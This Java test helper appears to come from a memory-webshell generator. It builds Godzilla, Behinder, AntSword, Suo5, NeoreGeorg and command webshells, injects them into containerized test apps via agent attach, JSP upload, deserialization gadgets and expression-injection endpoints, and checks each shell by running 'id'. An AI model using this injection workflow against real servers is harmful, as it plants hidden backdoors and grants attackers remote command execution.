package com.reajason.javaweb.integration;

import com.reajason.javaweb.antsword.AntSwordManager;
import com.reajason.javaweb.behinder.BehinderManager;
import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.Server;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.jar.AgentJarPacker;
import com.reajason.javaweb.packer.jar.AgentJarWithJDKAttacherPacker;
import com.reajason.javaweb.packer.jar.AgentJarWithJREAttacherPacker;
import com.reajason.javaweb.packer.jar.JarPacker;
import com.reajason.javaweb.suo5.Suo5Manager;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.testcontainers.containers.Container;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.shaded.org.apache.commons.io.FileUtils;
import org.testcontainers.shaded.org.apache.commons.lang3.RandomStringUtils;
import org.testcontainers.shaded.org.apache.commons.lang3.StringUtils;
import org.testcontainers.shaded.org.apache.commons.lang3.tuple.Pair;
import org.testcontainers.utility.MountableFile;

import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Objects;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {

    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer) {
        testShellInjectAssertOk(url, server, shellType, shellTool, targetJdkVersion, packer, null);
    }

    @SneakyThrows
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> container) {
        testShellInjectAssertOk(url, server, shellType, shellTool, targetJdkVersion, packer, container, null);
    }

    @SneakyThrows
    public static Pair<String, String> getUrls(String url, String shellType, ShellTool shellTool, Packers packer) {
        String shellUrl = url + "/test";
        String urlPattern = null;
        if (shellType.endsWith(ShellType.SERVLET)
                || shellType.endsWith(ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_METHOD)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_FUNCTION)
        ) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
        }

        if (shellType.endsWith(ShellType.WEBSOCKET)) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            URL url1 = new URL(url);
            shellUrl = "ws://" + url1.getHost() + ":" + url1.getPort() + url1.getPath() + urlPattern;
        }
        return Pair.of(shellUrl, urlPattern);
    }

    @SneakyThrows
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();

        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);

        GenerateResult generateResult = generate(urlPattern, server, shellType, shellTool, targetJdkVersion, shellToolConfig);

        packerResultAndInject(generateResult, url, shellTool, shellType, packer, appContainer);

        assertShellIsOk(generateResult, shellUrl, shellTool, shellType, appContainer, pythonContainer);
    }

    @SneakyThrows
    public static void packerResultAndInject(GenerateResult generateResult, String url, ShellTool shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) {
        String content = null;
        if (packer.getInstance() instanceof AgentJarPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            String stdout = appContainer.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ATTACH_ACK"),
                    containsString("JVM response code = 0")
            ));
        } else if (packer.getInstance() instanceof AgentJarWithJREAttacherPacker || packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            Container.ExecResult execResult = appContainer.execInContainer("java", "-jar", jarPath, pidInContainer);
            String stdout = execResult.getStdout();
            if (stdout.contains("executable file not found")) {
                execResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath, pidInContainer);
            }
            stdout = execResult.getStdout();
            System.out.println(stdout);
            System.out.println(execResult.getStderr());
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ok")
            ));
        } else {
            content = packer.getInstance().pack(generateResult.toClassPackerConfig());
            assertInjectIsOk(url, shellType, shellTool, content, packer, appContainer);
            log.info("send inject payload successfully");
        }
    }

    @SneakyThrows
    public static void assertShellIsOk(GenerateResult generateResult, String shellUrl, ShellTool shellTool, String shellType, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        switch (shellTool) {
            case Godzilla:
                testGodzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                break;
            case Command:
                if (shellType.endsWith(ShellType.WEBSOCKET)) {
                    testWebSocketCommandIsOk(shellUrl, "id");
                } else {
                    testCommandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()), "id");
                }
                break;
            case Behinder:
                testBehinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
                break;
            case Suo5:
                testSuo5IsOk(shellUrl, ((Suo5Config) generateResult.getShellToolConfig()));
                break;
            case AntSword:
                testAntSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                break;
            case NeoreGeorg:
                testNeoreGeorgIsOk(appContainer, pythonContainer, shellUrl, ((NeoreGeorgConfig) generateResult.getShellToolConfig()));
                break;
        }
    }

    private static void testNeoreGeorgIsOk(GenericContainer<?> container, GenericContainer<?> pythonContainer, String shellUrl, NeoreGeorgConfig shellToolConfig) throws Exception {
        URL url = new URL(shellUrl);
        shellUrl = "http://app:" + container.getExposedPorts().stream().findFirst().get() + url.getPath();
        String stdout = pythonContainer.execInContainer("python", "/app/neoreg.py", "-k", "key", "-H", shellToolConfig.getHeaderName() + ": " + shellToolConfig.getHeaderValue(), "-u", shellUrl).getStdout();
        log.info(stdout);
        assertTrue(stdout.contains("All seems fine"));
    }

    public static void testGodzillaIsOk(String entrypoint, GodzillaConfig shellConfig) {
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .key(shellConfig.getKey()).header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @SneakyThrows
    public static void testCommandIsOk(String entrypoint, CommandConfig shellConfig, String payload) {
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(shellConfig.getParamName(), payload)
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            System.out.println(res.trim());
            assertTrue(res.contains("uid="));
        }
    }

    @SneakyThrows
    public static void testWebSocketCommandIsOk(String entrypoint, String payload) {
        String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(entrypoint, payload);
        assertTrue(response.contains("uid="));
    }

    public static void testBehinderIsOk(String entrypoint, BehinderConfig shellConfig) {
        BehinderManager behinderManager = BehinderManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(behinderManager.test());
    }

    public static void testSuo5IsOk(String entrypoint, Suo5Config shellConfig) {
        assertTrue(Suo5Manager.test(entrypoint, shellConfig.getHeaderValue()));
    }

    public static void testAntSwordIsOk(String entrypoint, AntSwordConfig shellConfig) {
        AntSwordManager antSwordManager = AntSwordManager.builder()
                .entrypoint(entrypoint)
                .pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(antSwordManager.getInfo().contains("ok"));
    }

    public static ShellToolConfig getShellToolConfig(String shellType, ShellTool shellTool, Packers packer) {
        ShellToolConfig shellToolConfig = null;
        String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
        switch (shellTool) {
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                shellToolConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(uniqueName)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, User-Agent: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                break;
            case Command:
                shellToolConfig = CommandConfig.builder()
                        .paramName(uniqueName)
                        .build();
                log.info("generated {} command shell with paramName: {}", shellType, uniqueName);
                break;
            case Behinder:
                String behinderPass = "pass";
                shellToolConfig = BehinderConfig.builder()
                        .pass(behinderPass)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} behinder with pass: {}, User-Agent: {}", shellType, behinderPass, uniqueName);
                break;
            case Suo5:
                shellToolConfig = Suo5Config.builder()
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} suo5 with User-Agent: {}", shellType, uniqueName);
                break;
            case AntSword:
                String antPassword = "ant";
                shellToolConfig = AntSwordConfig.builder()
                        .pass(antPassword)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} antSword with pass: {}, User-Agent: {}", shellType, antPassword, uniqueName);
                break;
            case NeoreGeorg:
                shellToolConfig = NeoreGeorgConfig.builder()
                        .headerName("Referer")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                break;
        }
        return shellToolConfig;
    }

    public static GenerateResult generate(String urlPattern, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig) {
        InjectorConfig injectorConfig = new InjectorConfig();
        if (StringUtils.isNotBlank(urlPattern)) {
            injectorConfig.setUrlPattern(urlPattern);
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .byPassJavaModule(targetJdkVersion >= Opcodes.V9)
                .debug(true)
                .shrink(true)
                .build();
        return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packers packer, GenericContainer<?> container) {
        switch (packer) {
            case JSP, ClassLoaderJSP, DefineClassJSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + packer + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case JSPX -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jspx";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine -> VulTool.postData(url + "/js", content);
            case EL -> VulTool.postData(url + "/el", content);
            case SpEL, SpELSpringIOUtils, SpELScriptEngine, SpELSpringUtils -> VulTool.postData(url + "/spel", content);
            case OGNL, OGNLSpringIOUtils, OGNLScriptEngine, OGNLSpringUtils -> VulTool.postData(url + "/ognl", content);
            case MVEL -> VulTool.postData(url + "/mvel", content);
            case JXPath -> VulTool.postData(url + "/jxpath", content);
            case JEXL -> VulTool.postData(url + "/jexl2", content);
            case Aviator -> VulTool.postData(url + "/aviator", content);
            case Groovy -> VulTool.postData(url + "/groovy", content);
            case Rhino -> VulTool.postData(url + "/rhino", content);
            case BeanShell -> VulTool.postData(url + "/bsh", content);
            case JinJava -> VulTool.postData(url + "/jinjava", content);
            case Freemarker -> VulTool.postData(url + "/freemarker", content);
            case Velocity -> VulTool.postData(url + "/velocity", content);
            case JavaDeserialize -> VulTool.postData(url + "/java_deserialize", content);
            case JavaCommonsBeanutils16 -> VulTool.postData(url + "/java_deserialize/cb161", content);
            case JavaCommonsBeanutils17 -> VulTool.postData(url + "/java_deserialize/cb170", content);
            case JavaCommonsBeanutils18 -> VulTool.postData(url + "/java_deserialize/cb183", content);
            case JavaCommonsBeanutils19 -> VulTool.postData(url + "/java_deserialize/cb194", content);
            case JavaCommonsBeanutils110 -> VulTool.postData(url + "/java_deserialize/cb110", content);
            case JavaCommonsCollections3 -> VulTool.postData(url + "/java_deserialize/cc321", content);
            case JavaCommonsCollections4 -> VulTool.postData(url + "/java_deserialize/cc40", content);
            case HessianDeserialize -> VulTool.postData(url + "/hessian", content);
            case Hessian2Deserialize -> VulTool.postData(url + "/hessian2", content);
            case Base64 -> VulTool.postData(url + "/b64", content);
            case XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
            case H2, H2JS, H2Javac -> VulTool.postData(url + "/jdbc", content);
            default -> throw new IllegalStateException("Unexpected value: " + packer);
        }
    }
}
